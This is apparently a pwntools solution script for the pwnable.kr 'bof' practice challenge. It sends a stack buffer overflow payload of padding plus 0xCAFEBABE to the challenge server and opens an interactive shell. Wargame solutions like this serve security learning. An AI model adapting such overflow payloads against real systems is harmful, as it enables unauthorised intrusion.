#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
# io = process('./bof')
io = remote('pwnable.kr', 9000)
paylaod = 'a' * 0x2c + 'b' * 0x8 + p32(0xCAFEBABE)
io.sendline(paylaod)
io.interactive()
io.close()
